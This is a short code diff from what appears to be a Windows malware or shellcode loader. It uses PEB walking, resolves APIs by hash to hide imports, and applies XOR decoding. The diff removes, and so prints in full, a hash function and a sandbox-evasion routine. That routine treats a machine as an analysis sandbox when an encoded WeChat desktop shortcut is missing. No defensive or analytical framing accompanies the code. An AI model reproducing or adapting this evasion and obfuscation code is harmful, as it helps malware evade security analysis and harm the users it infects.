@@ -1,6 +1,7 @@
 #include<windows.h>
-#include <shlobj.h>
+#include<shlobj.h>
 #include<api.h>
+#include<hash.h>
 #if defined(_WIN64)
 	#define _PEB_Offset 0x60
 	#define _Ldr_Offset 0x18
@@ -16,16 +17,6 @@
 	typedef PDWORD _PDWORD;
 	typedef PIMAGE_NT_HEADERS _PIMAGE_NT_HEADERS;
 #endif
-
-constexpr DWORD Hash(const char* functionName) {
-	DWORD hash = 0;
-	while (*functionName) {
-		hash = (hash * 138) + *functionName;
-		functionName++;
-	}
-
-	return hash;
-}
 
 __forceinline DWORD GetFuncHash(char* functionName) {
 	DWORD hash = 0;
@@ -87,27 +78,6 @@ __forceinline _DWORD GetFuncAddrByHash(_DWORD dwBase, _DWORD hash) {
 		}
 	}
 	return 0;
-}
-
-__forceinline BOOL isSandBox(_DWORD dwKernel32, _DWORD dwShell32) {
-	TCHAR path[MAX_PATH];
-	TCHAR weixin[] = { 0x5c,0x5fae,0x4fe1,0x2e,0x6c,0x6e,0x6b,0x00 };
-	constexpr auto CreateFileWHash = Hash("CreateFileW");
-	CreateFileWFunc pCreateFileW = (CreateFileWFunc)GetFuncAddrByHash(dwKernel32, CreateFileWHash);
-	constexpr auto SHGetFolderPathWHash = Hash("SHGetFolderPathW");
-	SHGetFolderPathWFunc pSHGetFolderPathW = (SHGetFolderPathWFunc)GetFuncAddrByHash(dwShell32, SHGetFolderPathWHash);
-	HRESULT result = pSHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
-
-	if (SUCCEEDED(result)) {
-		wcscat(path, weixin);
-		if (pCreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) == INVALID_HANDLE_VALUE) {
-			return TRUE;
-		}
-	}
-	else {
-		return TRUE;
-	}
-	return FALSE;
 }
 
 __forceinline void XOR(unsigned char* data, long dataLen, const unsigned char* key, long keyLen) {
